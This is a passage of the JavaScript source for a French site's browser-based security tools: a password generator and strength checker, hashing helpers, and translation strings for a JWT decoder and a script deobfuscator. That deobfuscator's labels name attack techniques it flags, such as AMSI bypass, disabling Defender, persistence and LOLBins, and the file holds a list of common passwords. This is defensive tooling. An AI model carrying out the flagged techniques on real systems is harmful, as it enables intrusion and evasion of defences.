/* Outils cyber de manthole.github.io — tout est calculé dans le navigateur.
   Seule exception : le vérificateur de mots de passe interroge l'API Pwned Passwords
   avec les 5 premiers caractères du hash SHA-1 (k-anonymat), et uniquement sur clic.

   Chaque page d'outil a un <main data-tool="…"> ; le script initialise l'outil correspondant.
   Textes multilingues : L(fr, en) produit un <span lang> par langue (fr, en, es, pt, de), masqués par
   css/cyber.css selon la langue choisie. Les traductions es/pt/de viennent de la table I18N (clé = texte
   français) ; un texte absent de la table est affiché en anglais. L5() sert aux textes avec des valeurs. */
(function () {
  "use strict";

  /* ---------- Utilitaires ---------- */
  var $ = function (sel, root) { return (root || document).querySelector(sel); };
  var enc = new TextEncoder();

  function esc(s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }
  /* Traductions espagnol, portugais, allemand (clé : texte français). */
  var I18N = {
"copié ✓": [
"copiado ✓",
"copiado ✓",
"kopiert ✓"
],
"copier": [
"copiar",
"copiar",
"kopieren"
],
"des milliards d'années": [
"miles de millones de años",
"milhares de milhões de anos",
"Milliarden Jahre"
],
"instantané": [
"instantáneo",
"instantâneo",
"sofort"
],
"siècles": [
"siglos",
"séculos",
"Jahrhunderte"
],
"ans": [
"años",
"anos",
"Jahre"
],
"jours": [
"días",
"dias",
"Tage"
],
"heures": [
"horas",
"horas",
"Stunden"
],
"secondes": [
"segundos",
"segundos",
"Sekunden"
],
"Coche au moins une famille de caractères.": [
"Marca al menos una familia de caracteres.",
"Marca pelo menos uma família de caracteres.",
"Wähle mindestens eine Zeichenklasse."
],
"Entropie : ": [
"Entropía: ",
"Entropia: ",
"Entropie: "
],
"Fait partie des mots de passe les plus utilisés au monde.": [
"Es una de las contraseñas más utilizadas del mundo.",
"É uma das palavras-passe mais usadas no mundo.",
"Gehört zu den meistgenutzten Passwörtern der Welt."
],
"Repose sur un mot de passe très courant, avec quelques caractères ajoutés.": [
"Se basa en una contraseña muy común, con algunos caracteres añadidos.",
"Baseia-se numa palavra-passe muito comum, com alguns caracteres acrescentados.",
"Beruht auf einem sehr verbreiteten Passwort mit ein paar zusätzlichen Zeichen."
],
"Contient une suite de touches ou de caractères (abcd, 1234, azerty…).": [
"Contiene una secuencia de teclas o de caracteres (abcd, 1234, qwerty…).",
"Contém uma sequência de teclas ou de caracteres (abcd, 1234, qwerty…).",
"Enthält eine Tasten- oder Zeichenfolge (abcd, 1234, qwertz …)."
],
"Contient des répétitions (aaa, ababab…).": [
"Contiene repeticiones (aaa, ababab…).",
"Contém repetições (aaa, ababab…).",
"Enthält Wiederholungen (aaa, ababab …)."
],
"Contient une année : c'est souvent une date de naissance, facile à deviner.": [
"Contiene un año: suele ser una fecha de nacimiento, fácil de adivinar.",
"Contém um ano: muitas vezes uma data de nascimento, fácil de adivinhar.",
"Enthält eine Jahreszahl: oft ein Geburtsdatum, leicht zu erraten."
],
"Suit le modèle le plus prévisible : majuscule au début, chiffres à la fin.": [
"Sigue el patrón más previsible: mayúscula al principio, cifras al final.",
"Segue o padrão mais previsível: maiúscula no início, algarismos no fim.",
"Folgt dem vorhersehbarsten Muster: Großbuchstabe am Anfang, Ziffern am Ende."
],
"Moins de 12 caractères : la longueur est le critère qui compte le plus.": [
"Menos de 12 caracteres: la longitud es el criterio que más cuenta.",
"Menos de 12 caracteres: o comprimento é o critério que mais conta.",
"Weniger als 12 Zeichen: Die Länge ist das wichtigste Kriterium."
],
"Mélange davantage de types de caractères, ou allonge-le (une phrase de passe de 4-5 mots marche très bien).": [
"Mezcla más tipos de caracteres o alárgala (una frase de paso de 4-5 palabras funciona muy bien).",
"Mistura mais tipos de caracteres ou torna-a mais longa (uma frase-passe de 4-5 palavras funciona muito bem).",
"Mische mehr Zeichenarten oder mach es länger (eine Passphrase aus 4–5 Wörtern funktioniert sehr gut)."
],
"Très faible": [
"Muy débil",
"Muito fraca",
"Sehr schwach"
],
"Faible": [
"Débil",
"Fraca",
"Schwach"
],
"Moyen": [
"Media",
"Média",
"Mittel"
],
"Fort": [
"Fuerte",
"Forte",
"Stark"
],
"Très fort": [
"Muy fuerte",
"Muito forte",
"Sehr stark"
],
"longueur": [
"longitud",
"comprimento",
"Länge"
],
"types de caractères": [
"tipos de caracteres",
"tipos de caracteres",
"Zeichenarten"
],
"entropie estimée": [
"entropía estimada",
"entropia estimada",
"geschätzte Entropie"
],
"cassage hors ligne*": [
"cracking sin conexión*",
"cracking offline*",
"Offline-Cracking*"
],
"Points d'attention :": [
"Puntos de atención:",
"Pontos de atenção:",
"Worauf du achten solltest:"
],
"Aucun schéma prévisible détecté.": [
"No se ha detectado ningún patrón previsible.",
"Nenhum padrão previsível detetado.",
"Kein vorhersehbares Muster erkannt."
],
"Vérification en cours…": [
"Comprobando…",
"A verificar…",
"Wird geprüft …"
],
"Absent des fuites connues de Have I Been Pwned. Ça ne garantit pas qu'il soit robuste : regarde aussi l'analyse ci-dessus.": [
"No aparece en las filtraciones conocidas de Have I Been Pwned. Eso no garantiza que sea robusta: mira también el análisis de arriba.",
"Ausente das fugas conhecidas do Have I Been Pwned. Isso não garante que seja robusta: vê também a análise acima.",
"Nicht in den bekannten Leaks von Have I Been Pwned. Das heißt nicht, dass es stark ist: Sieh dir auch die Analyse oben an."
],
"Impossible de joindre le service de vérification. Réessaie plus tard.": [
"No se puede contactar con el servicio de comprobación. Vuelve a intentarlo más tarde.",
"Não foi possível contactar o serviço de verificação. Tenta mais tarde.",
"Der Prüfdienst ist nicht erreichbar. Versuch es später noch einmal."
],
"Aucune correspondance avec les empreintes ci-dessus.": [
"Ninguna coincidencia con las huellas de arriba.",
"Nenhuma correspondência com as impressões acima.",
"Kein Treffer bei den Hashes oben."
],
"Fichier trop volumineux (512 Mo maximum dans le navigateur).": [
"Archivo demasiado grande (512 MB como máximo en el navegador).",
"Ficheiro demasiado grande (512 MB no máximo no navegador).",
"Datei zu groß (maximal 512 MB im Browser)."
],
"Calcul en cours…": [
"Calculando…",
"A calcular…",
"Wird berechnet …"
],
"Le résultat n'est pas du texte : il est affiché en hexadécimal.": [
"El resultado no es texto: se muestra en hexadecimal.",
"O resultado não é texto: é mostrado em hexadecimal.",
"Das Ergebnis ist kein Text: Es wird hexadezimal angezeigt."
],
"Entrée invalide pour ce format.": [
"Entrada no válida para este formato.",
"Entrada inválida para este formato.",
"Ungültige Eingabe für dieses Format."
],
"émetteur": [
"emisor",
"emissor",
"Aussteller"
],
"émis le": [
"emitido el",
"emitido em",
"ausgestellt am"
],
"valide à partir du": [
"válido a partir del",
"válido a partir de",
"gültig ab"
],
"expire le": [
"caduca el",
"expira em",
"läuft ab am"
],
"C'est un JWE (jeton chiffré) : son contenu ne peut pas être lu sans la clé.": [
"Es un JWE (token cifrado): su contenido no se puede leer sin la clave.",
"É um JWE (token cifrado): o seu conteúdo não pode ser lido sem a chave.",
"Das ist ein JWE (verschlüsseltes Token): Sein Inhalt ist ohne Schlüssel nicht lesbar."
],
"Format invalide : un JWT contient trois parties séparées par des points.": [
"Formato no válido: un JWT contiene tres partes separadas por puntos.",
"Formato inválido: um JWT contém três partes separadas por pontos.",
"Ungültiges Format: Ein JWT besteht aus drei durch Punkte getrennten Teilen."
],
"Impossible de décoder l'en-tête ou le contenu (Base64URL ou JSON invalide).": [
"No se puede decodificar la cabecera o el contenido (Base64URL o JSON no válido).",
"Não foi possível descodificar o cabeçalho ou o conteúdo (Base64URL ou JSON inválido).",
"Header oder Payload lassen sich nicht dekodieren (ungültiges Base64URL oder JSON)."
],
"algorithme": [
"algoritmo",
"algoritmo",
"Algorithmus"
],
"Jeton <strong>expiré</strong>.": [
"Token <strong>caducado</strong>.",
"Token <strong>expirado</strong>.",
"Token <strong>abgelaufen</strong>."
],
"Jeton <strong>pas encore valide</strong> (nbf dans le futur).": [
"Token <strong>todavía no válido</strong> (nbf en el futuro).",
"Token <strong>ainda não válido</strong> (nbf no futuro).",
"Token <strong>noch nicht gültig</strong> (nbf in der Zukunft)."
],
"Jeton dans sa période de validité.": [
"Token dentro de su periodo de validez.",
"Token dentro do seu período de validade.",
"Token innerhalb seiner Gültigkeitsdauer."
],
"Aucune date d'expiration (exp) : ce jeton reste valable indéfiniment.": [
"Sin fecha de caducidad (exp): este token sigue siendo válido indefinidamente.",
"Sem data de expiração (exp): este token continua válido indefinidamente.",
"Kein Ablaufdatum (exp): Dieses Token bleibt unbegrenzt gültig."
],
"<strong>alg: none</strong> : jeton non signé. Un serveur qui l'accepte peut être contourné.": [
"<strong>alg: none</strong>: token sin firmar. Un servidor que lo acepte puede ser eludido.",
"<strong>alg: none</strong>: token não assinado. Um servidor que o aceite pode ser contornado.",
"<strong>alg: none</strong>: unsigniertes Token. Ein Server, der es akzeptiert, lässt sich umgehen."
],
"Signature HMAC à secret partagé : sa robustesse dépend entièrement de la longueur du secret.": [
"Firma HMAC con secreto compartido: su robustez depende por completo de la longitud del secreto.",
"Assinatura HMAC com segredo partilhado: a sua robustez depende inteiramente do comprimento do segredo.",
"HMAC-Signatur mit gemeinsamem Geheimnis: Ihre Stärke hängt vollständig von der Länge des Geheimnisses ab."
],
"L'en-tête pointe vers une clé distante (jku/x5u) : le serveur doit restreindre les URL acceptées.": [
"La cabecera apunta a una clave remota (jku/x5u): el servidor debe restringir las URL aceptadas.",
"O cabeçalho aponta para uma chave remota (jku/x5u): o servidor deve restringir os URL aceites.",
"Der Header verweist auf einen entfernten Schlüssel (jku/x5u): Der Server muss die zulässigen URLs einschränken."
],
"Le kid contient des caractères inhabituels : vérifie qu'il n'est pas utilisé tel quel dans un chemin ou une requête.": [
"El kid contiene caracteres inusuales: comprueba que no se use tal cual en una ruta o una consulta.",
"O kid contém caracteres invulgares: verifica que não é usado tal como está num caminho ou numa consulta.",
"Die kid enthält ungewöhnliche Zeichen: Prüfe, dass sie nicht unverändert in einem Pfad oder einer Abfrage landet."
],
"Le contenu semble contenir une donnée sensible : un JWT signé n'est pas chiffré, tout le monde peut le lire.": [
"El contenido parece incluir un dato sensible: un JWT firmado no está cifrado, cualquiera puede leerlo.",
"O conteúdo parece incluir um dado sensível: um JWT assinado não é cifrado, qualquer pessoa o pode ler.",
"Der Inhalt scheint sensible Daten zu enthalten: Ein signiertes JWT ist nicht verschlüsselt, jeder kann es lesen."
],
"La signature n'est pas vérifiée ici : décoder un jeton ne prouve pas qu'il est authentique.": [
"La firma no se verifica aquí: decodificar un token no demuestra que sea auténtico.",
"A assinatura não é verificada aqui: descodificar um token não prova que seja autêntico.",
"Die Signatur wird hier nicht geprüft: Ein Token zu dekodieren beweist nicht, dass es echt ist."
],
"Domaines": [
"Dominios",
"Domínios",
"Domains"
],
"(privée/réservée)": [
"(privada/reservada)",
"(privado/reservado)",
"(privat/reserviert)"
],
"Aucun indicateur trouvé.": [
"No se ha encontrado ningún indicador.",
"Nenhum indicador encontrado.",
"Keine Indikatoren gefunden."
],
"Entrée entièrement en Base64 décodée": [
"Entrada íntegramente en Base64 decodificada",
"Entrada inteiramente em Base64 descodificada",
"Reine Base64-Eingabe dekodiert"
],
"Commande PowerShell -EncodedCommand décodée (Base64, UTF-16LE)": [
"Comando PowerShell -EncodedCommand decodificado (Base64, UTF-16LE)",
"Comando PowerShell -EncodedCommand descodificado (Base64, UTF-16LE)",
"PowerShell-Befehl -EncodedCommand dekodiert (Base64, UTF-16LE)"
],
"Accents graves (`) retirés des mots-clés": [
"Acentos graves (`) eliminados de las palabras clave",
"Acentos graves (`) removidos das palavras-chave",
"Backticks (`) aus Schlüsselwörtern entfernt"
],
"Accents circonflexes (^) de cmd.exe retirés": [
"Circunflejos (^) de cmd.exe eliminados",
"Acentos circunflexos (^) do cmd.exe removidos",
"Zirkumflexe (^) von cmd.exe entfernt"
],
"Codes de caractères [char] convertis": [
"Códigos de caracteres [char] convertidos",
"Códigos de caracteres [char] convertidos",
"[char]-Zeichencodes umgewandelt"
],
"String.fromCharCode converti": [
"String.fromCharCode convertido",
"String.fromCharCode convertido",
"String.fromCharCode umgewandelt"
],
"Séquences d'échappement (\\x41, \\u0041…) décodées": [
"Secuencias de escape (\\x41, \\u0041…) decodificadas",
"Sequências de escape (\\x41, \\u0041…) descodificadas",
"Escape-Sequenzen (\\x41, \\u0041 …) dekodiert"
],
"Chaînes concaténées réunies": [
"Cadenas concatenadas unidas",
"Cadeias concatenadas unidas",
"Verkettete Zeichenketten zusammengeführt"
],
"Parenthèses superflues autour d'une chaîne retirées": [
"Paréntesis superfluos alrededor de una cadena eliminados",
"Parênteses supérfluos à volta de uma cadeia removidos",
"Überflüssige Klammern um Zeichenketten entfernt"
],
"Opérateur de format -f appliqué": [
"Operador de formato -f aplicado",
"Operador de formato -f aplicado",
"Formatoperator -f angewendet"
],
"Remplacements de texte (.Replace, -replace) appliqués": [
"Sustituciones de texto (.Replace, -replace) aplicadas",
"Substituições de texto (.Replace, -replace) aplicadas",
"Textersetzungen (.Replace, -replace) angewendet"
],
"Chaînes inversées remises à l'endroit": [
"Cadenas invertidas puestas del derecho",
"Cadeias invertidas repostas na ordem certa",
"Umgekehrte Zeichenketten zurückgedreht"
],
"Tableaux de chaînes joints": [
"Arrays de cadenas unidos",
"Arrays de cadeias unidos",
"Zeichenketten-Arrays zusammengefügt"
],
"unescape / decodeURIComponent décodés": [
"unescape / decodeURIComponent decodificados",
"unescape / decodeURIComponent descodificados",
"unescape / decodeURIComponent dekodiert"
],
"Base64 décodé ([Convert]::FromBase64String)": [
"Base64 decodificado ([Convert]::FromBase64String)",
"Base64 descodificado ([Convert]::FromBase64String)",
"Base64 dekodiert ([Convert]::FromBase64String)"
],
"Base64 décodé (atob)": [
"Base64 decodificado (atob)",
"Base64 descodificado (atob)",
"Base64 dekodiert (atob)"
],
"Code passé à eval / IEX mis à plat (sans l'exécuter)": [
"Código pasado a eval / IEX desplegado (sin ejecutarlo)",
"Código passado a eval / IEX desdobrado (sem o executar)",
"An eval / IEX übergebener Code entpackt (ohne Ausführung)"
],
"Variables constantes remplacées par leur valeur": [
"Variables constantes sustituidas por su valor",
"Variáveis constantes substituídas pelo seu valor",
"Konstante Variablen durch ihren Wert ersetzt"
],
"Exécution de code généré à la volée": [
"Ejecución de código generado sobre la marcha",
"Execução de código gerado dinamicamente",
"Ausführung dynamisch erzeugten Codes"
],
"Téléchargement depuis Internet": [
"Descarga desde Internet",
"Transferência a partir da Internet",
"Download aus dem Internet"
],
"PowerShell lancé discrètement (fenêtre cachée, politique contournée, commande encodée)": [
"PowerShell lanzado discretamente (ventana oculta, política eludida, comando codificado)",
"PowerShell lançado discretamente (janela oculta, política contornada, comando codificado)",
"Unauffällig gestartete PowerShell (verstecktes Fenster, umgangene Richtlinie, kodierter Befehl)"
],
"Contournement de l'AMSI (analyse antivirus des scripts)": [
"Elusión de AMSI (análisis antivirus de scripts)",
"Contorno do AMSI (análise antivírus de scripts)",
"AMSI-Umgehung (Virenscan von Skripten)"
],
"Désactivation ou exclusion de Microsoft Defender": [
"Desactivación o exclusión de Microsoft Defender",
"Desativação ou exclusão do Microsoft Defender",
"Microsoft Defender deaktiviert oder Ausnahme gesetzt"
],
"Tâche planifiée (persistance)": [
"Tarea programada (persistencia)",
"Tarefa agendada (persistência)",
"Geplante Aufgabe (Persistenz)"
],
"Clé Run ou dossier Démarrage (persistance)": [
"Clave Run o carpeta Inicio (persistencia)",
"Chave Run ou pasta Arranque (persistência)",
"Run-Schlüssel oder Autostart-Ordner (Persistenz)"
],
"Injection ou exécution de code en mémoire": [
"Inyección o ejecución de código en memoria",
"Injeção ou execução de código em memória",
"Prozessinjektion / Ausführung im Speicher"
],
"Chargement réflexif d'un programme .NET": [
"Carga reflexiva de un programa .NET",
"Carregamento reflexivo de um programa .NET",
"Reflektives Laden einer .NET-Assembly"
],
"Exécution via Windows Script Host (JScript/VBScript)": [
"Ejecución mediante Windows Script Host (JScript/VBScript)",
"Execução via Windows Script Host (JScript/VBScript)",
"Ausführung über Windows Script Host (JScript/VBScript)"
],
"Utilisation de WMI": [
"Uso de WMI",
"Utilização de WMI",
"Nutzung von WMI"
],
"Reconnaissance du système": [
"Reconocimiento del sistema",
"Reconhecimento do sistema",
"Systemerkundung"
],
"Binaire système détourné (LOLBin)": [
"Binario del sistema desviado (LOLBin)",
"Binário do sistema desviado (LOLBin)",
"Missbrauchte System-Binärdatei (LOLBin)"
],
"Obfuscation (encodage, codes de caractères…)": [
"Ofuscación (codificación, códigos de caracteres…)",
"Ofuscação (codificação, códigos de caracteres…)",
"Verschleierung (Kodierung, Zeichencodes …)"
],
"Aucune couche d'obfuscation reconnue.": [
"No se ha reconocido ninguna capa de ofuscación.",
"Nenhuma camada de ofuscação reconhecida.",
"Keine bekannte Verschleierungsschicht gefunden."
],
"Aucun comportement typique repéré.": [
"No se ha detectado ningún comportamiento típico.",
"Nenhum comportamento típico detetado.",
"Kein typisches Verhalten erkannt."
],
"Aucune couche reconnue : le script est peut-être déjà en clair, ou utilise une obfuscation non gérée.": [
"Ninguna capa reconocida: puede que el script ya esté en claro o que use una ofuscación no soportada.",
"Nenhuma camada reconhecida: o script talvez já esteja em claro, ou usa uma ofuscação não suportada.",
"Keine bekannte Schicht: Das Skript ist vielleicht schon im Klartext oder nutzt eine nicht unterstützte Verschleierung."
],
"Texte trop long (2 Mo maximum).": [
"Texto demasiado largo (2 MB como máximo).",
"Texto demasiado longo (2 MB no máximo).",
"Text zu lang (maximal 2 MB)."
],
"Analyse en cours…": [
"Analizando…",
"A analisar…",
"Wird analysiert …"
],
"Arrêt : le contenu décodé dépasse 8 Mo (possible bombe de décompression).": [
"Parada: el contenido decodificado supera 8 MB (posible bomba de descompresión).",
"Paragem: o conteúdo descodificado ultrapassa 8 MB (possível bomba de descompressão).",
"Abbruch: Der dekodierte Inhalt überschreitet 8 MB (mögliche Dekompressionsbombe)."
],
"Erreur pendant l'analyse.": [
"Error durante el análisis.",
"Erro durante a análise.",
"Fehler bei der Analyse."
],
"mois": [
"meses",
"meses",
"Monate"
],
"minutes": [
"minutos",
"minutos",
"Minuten"
],
"sujet": [
"sujeto",
"sujeito",
"Subjekt"
],
"audience": [
"audiencia",
"audiência",
"Zielgruppe"
],
"identifiant": [
"identificador",
"identificador",
"Token-ID"
]
};
  var XL = ["es", "pt", "de"];
  var LOCALES = { fr: "fr-FR", en: "en-US", es: "es-ES", pt: "pt-PT", de: "de-DE" };
  function unesc(s) {
    return String(s).replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
  }
  function L5(fr, en, es, pt, de) {
    return '<span lang="fr">' + fr + '</span><span lang="en">' + en + '</span><span lang="es">' + es +
      '</span><span lang="pt">' + pt + '</span><span lang="de">' + de + "</span>";
  }
  function L(fr, en) {
    var t = I18N[fr], escaped = false;
    if (!t && I18N[unesc(fr)]) { t = I18N[unesc(fr)]; escaped = fr !== unesc(fr); }
    var x = [en, en, en];
    if (t) for (var i = 0; i < 3; i++) x[i] = escaped ? esc(t[i]) : t[i];
    return L5(fr, en, x[0], x[1], x[2]);
  }
  /* Même valeur mise en forme selon chaque langue (nombres, dates). */
  function LF(fmt) {
    return L5(fmt("fr"), fmt("en"), fmt("es"), fmt("pt"), fmt("de"));
  }
  function lang() {
    var l = document.documentElement.lang;
    return LOCALES[l] ? l : "en";
  }
  function debounce(fn, ms) {
    var t;
    return function () {
      var args = arguments, self = this;
      clearTimeout(t);
      t = setTimeout(function () { fn.apply(self, args); }, ms);
    };
  }
  function toHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++) out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
    return out;
  }
  function msg(el, kind, html) {
    el.className = "tool-msg" + (kind ? " tool-msg--" + kind : "");
    el.innerHTML = html || "";
  }

  /* Placeholders multilingues : data-ph-fr, data-ph-en… mis à jour quand la langue change. */
  function applyPlaceholders() {
    var l = lang();
    document.querySelectorAll("[data-ph-fr]").forEach(function (el) {
      el.placeholder = el.getAttribute("data-ph-" + l) || el.getAttribute("data-ph-en") || "";
    });
  }
  new MutationObserver(applyPlaceholders).observe(document.documentElement, {
    attributes: true, attributeFilter: ["lang"]
  });

  /* Boutons « copier » : <button class="copy-btn" data-copy="#id"> ou créés par makeCopy(). */
  function copyText(text, btn) {
    function done() {
      btn.classList.add("is-done");
      btn.innerHTML = L("copié ✓", "copied ✓");
      setTimeout(function () {
        btn.classList.remove("is-done");
        btn.innerHTML = L("copier", "copy");
      }, 1400);
    }
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(text).then(done, function () {});
    } else {
      var ta = document.createElement("textarea");
      ta.value = text;
      ta.setAttribute("readonly", "");
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      try { document.execCommand("copy"); done(); } catch (e) {}
      document.body.removeChild(ta);
    }
  }
  function makeCopy(getText) {
    var b = document.createElement("button");
    b.type = "button";
    b.className = "copy-btn";
    b.innerHTML = L("copier", "copy");
    b.addEventListener("click", function () {
      var t = getText();
      if (t) copyText(t, b);
    });
    return b;
  }
  document.addEventListener("click", function (e) {
    var b = e.target.closest(".copy-btn[data-copy]");
    if (!b) return;
    var src = $(b.getAttribute("data-copy"));
    var text = src ? ("value" in src ? src.value : src.textContent) : "";
    if (text) copyText(text, b);
  });

  /* Aléa cryptographique uniforme dans [0, n) (rejet pour éviter le biais du modulo). */
  function randInt(n) {
    var limit = Math.floor(0x100000000 / n) * n;
    var buf = new Uint32Array(1);
    do { crypto.getRandomValues(buf); } while (buf[0] >= limit);
    return buf[0] % n;
  }

  function sha(algo, bytes) {
    return crypto.subtle.digest(algo, bytes).then(function (h) { return toHex(new Uint8Array(h)); });
  }

  /* MD5 (absent de WebCrypto, mais toujours utilisé pour comparer des IOC). */
  var MD5_K = new Int32Array(64);
  for (var ki = 0; ki < 64; ki++) MD5_K[ki] = Math.floor(Math.abs(Math.sin(ki + 1)) * 4294967296) | 0;
  var MD5_S = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
  function md5(bytes) {
    var len = bytes.length;
    var nWords = (((len + 8) >>> 6) + 1) * 16;
    var w = new Int32Array(nWords);
    for (var i = 0; i < len; i++) w[i >> 2] |= bytes[i] << ((i % 4) * 8);
    w[len >> 2] |= 0x80 << ((len % 4) * 8);
    w[nWords - 2] = (len * 8) >>> 0;
    w[nWords - 1] = Math.floor(len / 0x20000000);
    var a0 = 0x67452301, b0 = 0xefcdab89 | 0, c0 = 0x98badcfe | 0, d0 = 0x10325476;
    for (var off = 0; off < nWords; off += 16) {
      var A = a0, B = b0, C = c0, D = d0;
      for (var j = 0; j < 64; j++) {
        var F, g, r = j >> 4;
        if (r === 0) { F = (B & C) | (~B & D); g = j; }
        else if (r === 1) { F = (D & B) | (~D & C); g = (5 * j + 1) % 16; }
        else if (r === 2) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
        else { F = C ^ (B | ~D); g = (7 * j) % 16; }
        var s = MD5_S[r * 4 + (j % 4)];
        F = (F + A + MD5_K[j] + w[off + g]) | 0;
        A = D; D = C; C = B;
        B = (B + ((F << s) | (F >>> (32 - s)))) | 0;
      }
      a0 = (a0 + A) | 0; b0 = (b0 + B) | 0; c0 = (c0 + C) | 0; d0 = (d0 + D) | 0;
    }
    var out = new Uint8Array(16);
    [a0, b0, c0, d0].forEach(function (v, k) {
      for (var b = 0; b < 4; b++) out[k * 4 + b] = (v >>> (b * 8)) & 0xff;
    });
    return toHex(out);
  }

  function fmtDuration(sec) {
    if (!isFinite(sec) || sec > 1e15 * 31557600) return L("des milliards d'années", "billions of years");
    if (sec < 1) return L("instantané", "instant");
    var units = [
      [31557600 * 100, "siècles", "centuries"],
      [31557600, "ans", "years"],
      [2629800, "mois", "months"],
      [86400, "jours", "days"],
      [3600, "heures", "hours"],
      [60, "minutes", "minutes"],
      [1, "secondes", "seconds"]
    ];
    for (var i = 0; i < units.length; i++) {
      if (sec >= units[i][0]) {
        var v = sec / units[i][0];
        var n = v >= 1e6 ? v.toExponential(1) : LF(function (l) { return Math.round(v).toLocaleString(LOCALES[l]); });
        return n + " " + L(units[i][1], units[i][2]);
      }
    }
  }

  /* ---------- Générateur de mots de passe ---------- */
  var SETS = {
    lower: "abcdefghijklmnopqrstuvwxyz",
    upper: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    digits: "0123456789",
    symbols: "!#$%&()*+,-./:;<=>?@[]^_{|}~"
  };
  var AMBIGUOUS = /[Il1O0o|]/g;

  function initGenerator() {
    var range = $("#pg-length-range"), num = $("#pg-length"), out = $("#pg-output");
    var info = $("#pg-info"), count = $("#pg-count"), list = $("#pg-list");

    function sets() {
      var res = [];
      ["lower", "upper", "digits", "symbols"].forEach(function (k) {
        if ($("#pg-" + k).checked) {
          var s = SETS[k];
          if ($("#pg-ambiguous").checked) s = s.replace(AMBIGUOUS, "");
          res.push(s);
        }
      });
      return res;
    }
    function one(len, groups) {
      var pool = groups.join("");
      var chars = [];
      // au moins un caractère de chaque famille cochée, puis le reste au hasard, puis mélange
      groups.forEach(function (g) { chars.push(g[randInt(g.length)]); });
      while (chars.length < len) chars.push(pool[randInt(pool.length)]);
      chars.length = len;
      for (var i = chars.length - 1; i > 0; i--) {
        var j = randInt(i + 1), t = chars[i];
        chars[i] = chars[j]; chars[j] = t;
      }
      return chars.join("");
    }
    function generate() {
      var len = Math.min(128, Math.max(6, parseInt(num.value, 10) || 20));
      var groups = sets();
      if (!groups.length) {
        out.textContent = "";
        info.innerHTML = L("Coche au moins une famille de caractères.", "Select at least one character set.");
        list.innerHTML = "";
        return;
      }
      var pool = groups.join("").length;
      var bits = Math.floor(len * Math.log2(pool));
      out.textContent = one(len, groups);
      info.innerHTML = L("Entropie : ", "Entropy: ") + "<strong>" + bits + " bits</strong> · " +
        L5(pool + " caractères possibles", pool + " possible characters", pool + " caracteres posibles",
          pool + " caracteres possíveis", pool + " mögliche Zeichen");
      var n = Math.min(20, Math.max(1, parseInt(count.value, 10) || 1));
      var lines = [];
      for (var i = 1; i < n; i++) lines.push(one(len, groups));
      list.textContent = lines.join("\n");
      list.hidden = lines.length === 0;
    }
    range.addEventListener("input", function () { num.value = range.value; generate(); });
    num.addEventListener("change", function () {
      num.value = Math.min(128, Math.max(6, parseInt(num.value, 10) || 20));
      range.value = Math.min(64, num.value);
      generate();
    });
    document.querySelectorAll("#pg-options input, #pg-count").forEach(function (el) {
      el.addEventListener("change", generate);
    });
    $("#pg-generate").addEventListener("click", generate);
    $("#pg-copy-slot").appendChild(makeCopy(function () { return out.textContent; }));
    generate();
  }

  /* ---------- Vérificateur de mot de passe ---------- */
  var COMMON = ("123456 123456789 12345678 password qwerty 12345 1234567 111111 123123 abc123 password1 " +
    "1234567890 000000 iloveyou azerty qwertyuiop 654321 666666 121212 dragon monkey letmein football " +
    "sunshine princess admin welcome login master hello freedom whatever shadow superman batman trustno1 " +
    "motdepasse soleil doudou loulou chouchou marseille bonjour jetaime nicolas camille passw0rd p@ssw0rd " +
    "azerty123 qwerty123 changeme root toor test test123 secret").split(" ");
  var SEQS = ["abcdefghijklmnopqrstuvwxyz", "0123456789", "qwertyuiop", "asdfghjkl", "zxcvbnm",
    "azertyuiop", "qsdfghjklm", "wxcvbn"];

  function analyse(pw) {
    var classes = { lower: /[a-z]/.test(pw), upper: /[A-Z]/.test(pw), digits: /\d/.test(pw),
      symbols: /[\x21-\x2f\x3a-\x40\x5b-\x60\x7b-\x7e]/.test(pw),
      other: /[^\x00-\x7f]/.test(pw), space: /\s/.test(pw) };
    var pool = (classes.lower ? 26 : 0) + (classes.upper ? 26 : 0) + (classes.digits ? 10 : 0) +
      (classes.symbols ? 33 : 0) + (classes.other ? 100 : 0) + (classes.space ? 1 : 0);
    var chars = Array.from(pw);
    var bits = chars.length * Math.log2(Math.max(pool, 1));
    var notes = [];
    var low = pw.toLowerCase();
    function unleet(s) {
      return s.replace(/[@4]/g, "a").replace(/3/g, "e").replace(/[1!|]/g, "i").replace(/0/g, "o")
        .replace(/[$5]/g, "s").replace(/7/g, "t");
    }
    var leet = unleet(low);
    // mot de base : on retire d'abord les chiffres/symboles ajoutés au début et à la fin, puis on « dé-leet »
    var base = unleet(low.replace(/[\d\W_]+$/, "").replace(/^[\d\W_]+/, ""));

    if (COMMON.indexOf(low) !== -1 || COMMON.indexOf(leet) !== -1) {
      bits = Math.min(bits, 4);
      notes.push(L("Fait partie des mots de passe les plus utilisés au monde.",
        "It is one of the most used passwords in the world."));
    } else if (base.length >= 4 && COMMON.indexOf(base) !== -1) {
      bits = Math.min(bits, 14 + (chars.length - base.length) * 3.3);
      notes.push(L("Repose sur un mot de passe très courant, avec quelques caractères ajoutés.",
        "Built on a very common password with a few characters added."));
    }
    // séquences (abcd, 1234, qwerty…) dans un sens ou dans l'autre
    var seqLen = 0;
    SEQS.forEach(function (s) {
      var r = s.split("").reverse().join("");
      for (var n = Math.min(low.length, s.length); n >= 4; n--) {
        for (var i = 0; i + n <= low.length; i++) {
          var part = low.substr(i, n);
          if ((s.indexOf(part) !== -1 || r.indexOf(part) !== -1) && n > seqLen) seqLen = n;
        }
      }
    });
    if (seqLen) {
      bits -= (seqLen - 1) * Math.log2(Math.max(pool, 1)) * 0.8;
      notes.push(L("Contient une suite de touches ou de caractères (abcd, 1234, azerty…).",
        "Contains a keyboard or character sequence (abcd, 1234, qwerty…)."));
    }
    // répétitions (aaaa, ababab)
    var rep = pw.match(/(.+?)\1{2,}/g);
    if (rep) {
      var lost = rep.reduce(function (s, m) { return s + m.length; }, 0) * 0.7;
